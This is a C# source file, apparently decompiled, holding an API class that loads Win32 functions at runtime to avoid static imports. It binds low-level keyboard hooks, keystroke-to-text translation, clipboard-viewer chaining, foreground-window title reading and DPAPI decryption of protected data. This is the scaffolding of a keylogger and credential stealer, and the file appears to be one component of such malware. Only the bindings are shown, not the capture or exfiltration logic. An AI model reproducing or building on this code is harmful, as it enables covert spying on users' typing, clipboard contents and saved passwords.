using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

internal class API
{
	public class Dynamic
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		public static T CreateMethod<T>(IntPtr library, string name)
		{
			try
			{
				IntPtr procAddress = GetProcAddress(library, name);
				Type typeFromHandle = typeof(T);
				object delegateForFunctionPointer = Marshal.GetDelegateForFunctionPointer(procAddress, typeFromHandle);
				return Conversions.ToGenericParameter<T>(RuntimeHelpers.GetObjectValue(delegateForFunctionPointer));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return default(T);
		}

		public static T CreateMethod<T>(string library, string name)
		{
			return CreateMethod<T>(LoadLibrary(library), name);
		}
	}

	public delegate IntPtr GetForegroundWindowDelegate();

	public delegate int GetWindowTextDelegate(IntPtr hwnd, StringBuilder lpString, int cch);

	public delegate int GetWindowThreadProcessIdDelegate(IntPtr hwnd, ref int lpdwProcessId);

	public delegate bool UnhookWindowsHookExDelegate(IntPtr hhk);

	public delegate IntPtr SetWindowsHookExDelegate(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

	public delegate IntPtr CallNextHookExDelegate(IntPtr hhk, int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

	public delegate int ToUnicodeExDelegate(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	public delegate short GetKeyStateDelegate(uint nVirtKey);

	public delegate bool GetKeyboardStateDelegate(byte[] lpKeyState);

	public delegate IntPtr GetKeyboardLayoutDelegate(uint idThread);

	public delegate IntPtr SetClipboardViewerDelegate(IntPtr hWndNewViewer);

	public delegate bool ChangeClipboardChainDelegate(IntPtr hWndRemove, IntPtr hWndNewNext);

	public delegate long SendMessageDelegate(IntPtr handle, int code, IntPtr flags, IntPtr data);

	public delegate int GetMessageTimeDelegate();

	public delegate bool CryptUnprotectDataDelegate(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref object pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	public delegate IntPtr HookProc(int code, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	public struct KBDLLHOOKSTRUCT
	{
		public uint vkCode;

		public uint scanCode;

		public uint flags;

		public uint time;

		public UIntPtr dwExtraInfo;
	}

	public enum HookType
	{
		WH_JOURNALRECORD,
		WH_JOURNALPLAYBACK,
		WH_KEYBOARD,
		WH_GETMESSAGE,
		WH_CALLWNDPROC,
		WH_CBT,
		WH_SYSMSGFILTER,
		WH_MOUSE,
		WH_HARDWARE,
		WH_DEBUG,
		WH_SHELL,
		WH_FOREGROUNDIDLE,
		WH_CALLWNDPROCRET,
		WH_KEYBOARD_LL,
		WH_MOUSE_LL
	}

	public enum Message
	{
		WM_DRAWCLIPBOARD = 776,
		WM_CHANGECBCHAIN = 781
	}

	public static GetForegroundWindowDelegate GetForegroundWindow;

	public static GetWindowTextDelegate GetWindowText;

	public static GetWindowThreadProcessIdDelegate GetWindowThreadProcessId;

	public static UnhookWindowsHookExDelegate UnhookWindowsHookEx;

	public static SetWindowsHookExDelegate SetWindowsHookEx;

	public static CallNextHookExDelegate CallNextHookEx;

	public static ToUnicodeExDelegate ToUnicodeEx;

	public static GetKeyStateDelegate GetKeyState;

	public static GetKeyboardStateDelegate GetKeyboardState;

	public static GetKeyboardLayoutDelegate GetKeyboardLayout;

	public static SetClipboardViewerDelegate SetClipboardViewer;

	public static ChangeClipboardChainDelegate ChangeClipboardChain;

	public static SendMessageDelegate SendMessage;

	public static GetMessageTimeDelegate GetMessageTime;

	public static CryptUnprotectDataDelegate CryptUnprotectData;

	public static void InvokeMethods()
	{
		try
		{
			GetForegroundWindow = Dynamic.CreateMethod<GetForegroundWindowDelegate>("user32.dll", "GetForegroundWindow");
			GetWindowText = Dynamic.CreateMethod<GetWindowTextDelegate>("user32.dll", "GetWindowTextA");
			GetWindowThreadProcessId = Dynamic.CreateMethod<GetWindowThreadProcessIdDelegate>("user32.dll", "GetWindowThreadProcessId");
			UnhookWindowsHookEx = Dynamic.CreateMethod<UnhookWindowsHookExDelegate>("user32.dll", "UnhookWindowsHookEx");
			SetWindowsHookEx = Dynamic.CreateMethod<SetWindowsHookExDelegate>("user32.dll", "SetWindowsHookExA");
			CallNextHookEx = Dynamic.CreateMethod<CallNextHookExDelegate>("user32.dll", "CallNextHookEx");
			ToUnicodeEx = Dynamic.CreateMethod<ToUnicodeExDelegate>("user32.dll", "ToUnicodeEx");
			GetKeyState = Dynamic.CreateMethod<GetKeyStateDelegate>("user32.dll", "GetKeyState");
			GetKeyboardState = Dynamic.CreateMethod<GetKeyboardStateDelegate>("user32.dll", "GetKeyboardState");
			GetKeyboardLayout = Dynamic.CreateMethod<GetKeyboardLayoutDelegate>("user32.dll", "GetKeyboardLayout");
			SetClipboardViewer = Dynamic.CreateMethod<SetClipboardViewerDelegate>("user32.dll", "SetClipboardViewer");
			ChangeClipboardChain = Dynamic.CreateMethod<ChangeClipboardChainDelegate>("user32.dll", "ChangeClipboardChain");
			SendMessage = Dynamic.CreateMethod<SendMessageDelegate>("user32.dll", "SendMessageA");
			GetMessageTime = Dynamic.CreateMethod<GetMessageTimeDelegate>("user32.dll", "GetMessageTime");
			CryptUnprotectData = Dynamic.CreateMethod<CryptUnprotectDataDelegate>("Crypt32.dll", "CryptUnprotectData");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
